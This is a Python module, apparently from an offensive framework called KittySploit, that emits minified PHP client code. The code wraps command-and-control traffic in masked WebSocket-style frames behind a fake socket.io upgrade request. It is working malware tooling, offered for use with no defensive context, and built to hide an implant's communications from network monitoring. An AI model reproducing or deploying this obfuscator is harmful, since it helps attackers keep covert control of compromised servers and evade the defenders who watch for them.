#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional
from modules.obfuscators.python.protocol.websocket_mimic import Module as PythonWebSocketObfuscator


class Module(PythonWebSocketObfuscator):
    """PHP WebSocket binary frame mimic obfuscator."""

    SUPPORTED_CLIENT_LANGUAGES = ["php"]

    __info__ = {
        "name": "PHP WebSocket Mimic Obfuscator",
        "description": "Wraps C2 bytes in WebSocket-like binary frames and emits PHP client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "php":
            return None
        return (
            "$obf_buf='';$obf_first=true;"
            "function _obf_ws_frame($c){$l=strlen($c);if($l>65535){$c=substr($c,0,65535);$l=65535;}$h=chr(0x82);"
            "if($l<126){$h.=chr(0x80|$l);}else{$h.=chr(0x80|126).chr(($l>>8)&255).chr($l&255);}"
            "$m=function_exists('random_bytes')?random_bytes(4):pack('N',mt_rand());$o='';for($i=0;$i<$l;$i++){$o.=chr(ord($c[$i])^ord($m[$i%4]));}return $h.$m.$o;}"
            "function _obf_encode($d){global $obf_first;if($d===''){return $d;}$out='';"
            "if($obf_first){$out=\"GET /socket.io/?transport=websocket HTTP/1.1\\r\\nHost: update.local\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\nSec-WebSocket-Version: 13\\r\\n\\r\\n\";$obf_first=false;}"
            "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,65535);$i+=strlen($c);$out.=_obf_ws_frame($c);}return $out;}"
            "function _obf_decode($d){global $obf_buf;$obf_buf.=$d;$out='';"
            "while($obf_buf!==''){if(strncmp($obf_buf,'HTTP/',5)===0||strncmp($obf_buf,'GET ',4)===0||strncmp($obf_buf,'POST ',5)===0){$e=strpos($obf_buf,\"\\r\\n\\r\\n\");if($e===false){break;}$obf_buf=substr($obf_buf,$e+4);continue;}"
            "if(strlen($obf_buf)<2){break;}$b=ord($obf_buf[1]);$masked=($b&0x80)!==0;$ln=$b&0x7f;$pos=2;"
            "if($ln===126){if(strlen($obf_buf)<4){break;}$ln=(ord($obf_buf[2])<<8)|ord($obf_buf[3]);$pos=4;}else if($ln===127){$obf_buf=substr($obf_buf,1);continue;}"
            "if($ln>65535){$obf_buf=substr($obf_buf,1);continue;}$mask='';if($masked){if(strlen($obf_buf)<$pos+4){break;}$mask=substr($obf_buf,$pos,4);$pos+=4;}"
            "$end=$pos+$ln;if(strlen($obf_buf)<$end){break;}$p=substr($obf_buf,$pos,$ln);$obf_buf=substr($obf_buf,$end);"
            "if($masked){$u='';for($i=0;$i<strlen($p);$i++){$u.=chr(ord($p[$i])^ord($mask[$i%4]));}$p=$u;}$out.=$p;}return $out;}"
        )
